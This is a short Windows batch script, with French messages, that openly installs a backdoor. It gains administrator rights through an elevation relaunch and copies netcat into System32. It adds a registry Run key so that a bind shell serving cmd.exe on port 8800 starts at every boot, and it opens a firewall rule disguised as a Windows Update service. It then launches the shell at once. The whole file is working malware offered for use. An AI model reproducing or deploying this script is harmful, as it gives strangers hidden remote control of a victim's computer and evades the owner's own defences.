@echo off
color 2
echo Permissions Administrateur en cours d'obtention... 
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit)
cls
echo Permissions Administrateur obtenues! 
echo>nul
echo Finalisation de l'installation de la B4CKD00R en cours....
xcopy "%appdata%\nc.exe" "%SYSTEMROOT%\System32" /Y
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysStart32"  /t "REG_SZ" /d "%SYSTEMROOT%\System32\nc.exe -d -L -e cmd.exe -p 8800" /f
cls
set PORT=8800
set RULE_NAME="Winbck (Windows Update Service)"
netsh advfirewall firewall show rule name=%RULE_NAME% >nul
echo Bypass Du Pare-Feu en cours...
netsh advfirewall firewall add rule name=%RULE_NAME% dir=in action=allow protocol=TCP localport=%PORT%
nc -d -t -e cmd.exe -p 8800
cls
echo Pare-Feu bypassed. La B4CKD00R est maintenant installee.
echo Go Foutre Le Bordel :3 
echo ©MiR, BAckd00r Project - 2020 - discord.gg/R3xDYcM
ping 0.0.0.0 -n 2 >nul
exit